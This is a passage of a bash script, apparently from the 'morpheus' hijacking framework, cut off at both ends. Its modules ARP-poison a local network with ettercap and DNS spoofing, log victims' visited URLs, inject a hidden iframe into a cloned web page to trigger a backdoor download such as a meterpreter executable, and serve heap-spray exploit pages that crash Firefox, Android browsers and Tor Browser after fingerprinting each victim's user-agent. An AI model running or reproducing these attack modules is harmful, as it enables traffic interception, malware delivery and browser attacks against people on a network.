xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/redirect.eft -o $IPATH/output/redirect.ef && sleep 3"
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/sphere_prank -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/sphere_prank -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
  rm $IPATH/output/redirect.ef > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft > /dev/null 2>&1 # backup
  rm -R $ApachE/"Google Sphere_files"
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}





# -----------------------------------------------
# CAPTURE TARGET BROWSING HISTORY [URL's VISITED]
# -----------------------------------------------
sh_stage6 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}  This module will capture target browsing surfing [url visited]  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  and display then with the help of urlsnarf, this module will    ${BlueF}|"
echo "${BlueF}    | ${YellowF}    also store urls visited into morpheus/logs/grab_hosts.log     ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then


ch=`which urlsnarf`
if [ "$ch" != "$UsNar" ]; then
echo ${RedF}[x]${white} urlsnarf utility not found${RedF}!${Reset};
sleep 1
echo ${RedF}[x]${white} please Install:${RedF}dnsniff${white} packet...${Reset};
sleep 3
sh_exit
fi

# get user input to build filter
rm $IPATH/logs/grab_hosts.log > /dev/null 2>&1
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/filters/grab_hosts.eft $IPATH/filters/grab_hosts.rb > /dev/null 2>&1 # backup
  # use SED bash command
  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/grab_hosts.eft > /dev/null 2>&1
  cd $IPATH
  sleep 1

  # compiling UserAgent.eft to be used in ettercap
  echo ${BlueF}[☠]${white} Compiling grab_hosts.eft${RedF}!${Reset};
  xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/grab_hosts.eft -o $IPATH/output/grab_hosts.ef && sleep 3"
  sleep 1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Please wait, Capturing ${YellowF}HTTP${white} traffic${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
      echo ${RedF}  # webspy -i $InT3R $UpL
        xterm -T "browsing capture [press ctrl+c to exit]" -geometry 81x52 -e "urlsnarf -i $InT3R | cut -d '\"' -f4" & ettercap -T --visual text -q -i $InT3R -F $IPATH/output/grab_hosts.ef -M ARP /$rhost// /$gateway//
      else
      echo ${RedF}
        xterm -T "browsing capture [press ctrl+c to exit]" -geometry 81x52 -e "urlsnarf -i $InT3R | cut -d '\"' -f4" & ettercap -T --visual text -q -i $InT3R -F $IPATH/output/grab_hosts.ef -M ARP /$rhost/ /$gateway/
      fi

  # display captured brosing hitory to user
  HoSt=`cat $IPATH/logs/grab_hosts.log | grep "Host:"` > /dev/null 2>&1
  echo ""
  echo "${BlueF}[☠]${white} host:${YellowF}$UpL ${white}browsing history stored${RedF}!"
  echo "${BlueF}[☠]${white} Please check: morpheus/logs/grab_hosts.log${RedF}!"
  sleep 3


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/grab_hosts.rb $IPATH/filters/grab_hosts.eft > /dev/null 2>&1 # backup
  rm $IPATH/output/grab_hosts.ef > /dev/null 2>&1
  cd $IPATH
  sleep 2

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}





# --------------------------------------------------------
# CLONE WEBSITE AND INJECT BACKDOOR ON </BODY><IFRAME> TAG
# --------------------------------------------------------
sh_stage7 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    This module will embbeded your payload into a fake webpage    ${BlueF}|"
echo "${BlueF}    | ${YellowF}     and delivers it using mitm+dns_spoof (trigger download)      ${BlueF}|"
echo "${BlueF}    | ${YellowF}    'All [.com] domains will be redirected to the fake webpage'   ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
UpL=$(zenity --title "☠ PAYLOAD TO BE UPLOADED ☠" --filename=$IPATH --file-selection --text "chose payload to be uploded\nexample:meterpreter.exe") > /dev/null 2>&1
dIc=$(zenity --title="☠ PAYLOAD NAME ☠" --text "Enter payload to be uploaded name\nexample:meterpreter.exe" --entry --width 270) > /dev/null 2>&1


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
  # using bash SED to inject our malicious <iframe>
  cd phishing
  sed "s|<\/body>|<iframe width=\"1\" height=\"1\" frameborder=\"0\" src=\"http://$IP/$dIc\"><\/iframe><\/body>|" clone.html > clone2.html
  # copy files to apache2 webroot
  mv clone2.html $ApachE/index.html > /dev/null 2>&1
  cp miss.png $ApachE > /dev/null 2>&1
  cp $UpL $ApachE > /dev/null 2>&1
  rm clone2.html > /dev/null 2>&1
  cd ..
  # use SED bash command to config our etter.dns
  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  cd $IPATH
  sleep 1


# IF NOT EXIST FILE IN APACHE, ABORT..
if ! [ -e $ApachE/$dIc ]; then
echo ${RedF}[x]${white} Backdoor:${RedF}$dIc ${white}not found...${Reset};
sleep 3
cd $ApachE
rm *.exe
rm $ApachE/miss.png > /dev/null 2>&1
cd $IPATH
sh_exit # jump to exit ...
fi

echo ${BlueF}[☠]${white} Found:${GreenF}$dIc${RedF}!${Reset};
sleep 1

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/clone_creds -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/clone_creds -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  rm $ApachE/miss.png > /dev/null 2>&1
  rm $ApachE/$dIc > /dev/null 2>&1
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# ----------------------------------------------------
# FIREFOX =< 49.0.1 DENIAL-OF-SERVICE [mitm+dns_spoof]
# ----------------------------------------------------
sh_stage8 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF} This module will crash target mozilla firefox (=< 49.0.1) using  ${BlueF}|"
echo "${BlueF}    | ${YellowF} a Heap Spray writen in javascript (deliver under mitm+dns_spoof) ${BlueF}|"
echo "${BlueF}    | ${YellowF}  'All [.com] domains will be redirected to the exploit webpage'  ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  1 - Capture a tcp/udp packet from target host to verify vuln    ${BlueF}|"
echo "${BlueF}    | ${YellowF}  2 - If firefox version its exploitable then deliver payload.    ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
rm $IPATH/logs/UserAgent.log > /dev/null 2>&1
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb > /dev/null 2>&1 # backup
  # copy files to apache2 webroot
  cp $IPATH/bin/phishing/Firefox-D0S-49.0.1.html $ApachE/index.html > /dev/null 2>&1
  # use SED bash command
  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft > /dev/null 2>&1
  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  cd $IPATH
  sleep 1

  # compiling UserAgent.eft to be used in ettercap
  echo ${BlueF}[☠]${white} Compiling UserAgent.eft${RedF}!${Reset};
  xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/UserAgent.eft -o $IPATH/output/UserAgent.ef && sleep 3"
  sleep 1

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset}; 
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
      else
        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
      fi

  # check if target system its vulnerable (firefox version)
  # User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0
  nOn="49" # above versions are patched (official release its 51.0.1)...
  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}` > /dev/null 2>&1
  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}` > /dev/null 2>&1
  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}` > /dev/null 2>&1
  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent" | cut -d 'F' -f2 | cut -d '/' -f2 | cut -d '.' -f1` > /dev/null 2>&1
  echo "${GreenF}    Host: $HoSt"
  sleep 1
  echo "${GreenF}    Accept-Language: $AcLa"
  sleep 1
  echo "${GreenF}    $DisP"
  sleep 1


if [ "$VeVul" \> "$nOn" ]; then
echo "${GreenF}    Browser report:${RedF} not vulnerable...${BlueF}"
sleep 3
echo "${RedF}[x]${white} module cant verify browser version${RedF}!"
sleep 1
else
echo "${GreenF}    Browser report: vulnerable...${BlueF}"
sleep 3
fi

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost/ /$gateway/
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1 # backup
  rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
  rm $ApachE/index.html > /dev/null 2>&1
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# --------------------------------------------------
# ANDROID BROWSER DENIAL-OF-SERVICE [mitm+dns_spoof]
# --------------------------------------------------
sh_stage9 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    This module will crash target android browsers by using a     ${BlueF}|"
echo "${BlueF}    | ${YellowF}   Heap Spray writen in javascript (deliver under mitm+dns_spoof) ${BlueF}|"
echo "${BlueF}    | ${YellowF}   'All [.com] domains will be redirected to the exploit webpage' ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}   1 - Capture a tcp/udp packet from target host to verify vuln   ${BlueF}|"
echo "${BlueF}    | ${YellowF}   2 - If browser version its exploitable then deliver payload.   ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
rm $IPATH/logs/UserAgent.log > /dev/null 2>&1
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb > /dev/null 2>&1 # backup
  # copy files to apache2 webroot
  cp $IPATH/bin/phishing/Android-DOS-4.0.3.html $ApachE/index.html > /dev/null 2>&1
  # use SED bash command
  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft > /dev/null 2>&1
  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  cd $IPATH
  sleep 1

  # compiling UserAgent.eft to be used in ettercap
  echo ${BlueF}[☠]${white} Compiling UserAgent.eft${RedF}!${Reset};
  xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/UserAgent.eft -o $IPATH/output/UserAgent.ef && sleep 3"
  sleep 1

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset}; 
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
      else
        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
      fi

# check if target system its vuln
# Mozilla/5.0 (Linux; Android 6.0.1; VFD 600 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
# Mozilla/5.0 (Linux; U; Android 4.0.3; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
  nOn="Android"
  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}` > /dev/null 2>&1
  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}` > /dev/null 2>&1
  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}` > /dev/null 2>&1
  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | grep -o "Android"` > /dev/null 2>&1 # user-agent == Android
  echo "${GreenF}    Host: $HoSt"
  sleep 1
  echo "${GreenF}    Accept-Language: $AcLa"
  sleep 1
  echo "${GreenF}    $DisP"
  sleep 1


# if in captured packet its writen: Android then its vulnerable
if [ "$VeVul" = "$nOn" ]; then
echo "${GreenF}    Browser report: vulnerable...${BlueF}"
sleep 3
else
echo "${GreenF}    Browser report:${RedF} not vulnerable...${BlueF}"
sleep 3
echo "${RedF}[x]${white} module cant verify browser version${RedF}!"
sleep 1
fi

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost/ /$gateway/
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1 # backup
  rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
  rm $ApachE/index.html > /dev/null 2>&1
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}





# -----------------------------------------------------
# TOR-BROWSER BUFFER OVERFLOW EXPLOIT [windows systems]
# -----------------------------------------------------
sh_stage10 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF} This module will crash target tor-browser (windows sys) using a  ${BlueF}|"
echo "${BlueF}    | ${YellowF} Heap Spray writen in javascript (deliver under mitm + dns_spoof) ${BlueF}|"
echo "${BlueF}    | ${YellowF}  'All [.com] domains will be redirected to the exploit webpage'  ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  1 - Capture a tcp/udp packet from target host to verify vuln    ${BlueF}|"
echo "${BlueF}    | ${YellowF}  2 - If tor version its exploitable then deliver payload.        ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
rm $IPATH/logs/UserAgent.log > /dev/null 2>&1
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb > /dev/null 2>&1 # backup
  # copy files to apache2 webroot
  cp $IPATH/bin/phishing/tor_0day/cssbanner.js $ApachE/cssbanner.js > /dev/null 2>&1
  cp $IPATH/bin/phishing/tor_0day/Tor-Exploit.html $ApachE/index.html > /dev/null 2>&1
  # use SED bash command
  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft > /dev/null 2>&1
  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  cd $IPATH
  sleep 1

  # compiling UserAgent.eft to be used in ettercap
  echo ${BlueF}[☠]${white} Compiling UserAgent.eft${RedF}!${Reset};
  xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/UserAgent.eft -o $IPATH/output/UserAgent.ef && sleep 3"
  sleep 1

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset}; 
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
      else
        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
      fi

  # check if target system its vulnerable
  # User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
  nOn="Windows NT" # only windows systems are affected...
  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}` > /dev/null 2>&1
  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}` > /dev/null 2>&1
  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | grep -o "Windows NT"` > /dev/null 2>&1
  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}` > /dev/null 2>&1
  echo "${GreenF}    Host: $HoSt"
  sleep 1
  echo "${GreenF}    Accept-Language: $AcLa"
  sleep 1
  echo "${GreenF}    $DisP"
  sleep 1


if [ "$VeVul" != "$nOn" ]; then
echo "${GreenF}    System report:${RedF} not vulnerable...${BlueF}"
sleep 3
echo "${RedF}[x]${white} module cant verify system distro${RedF}!"
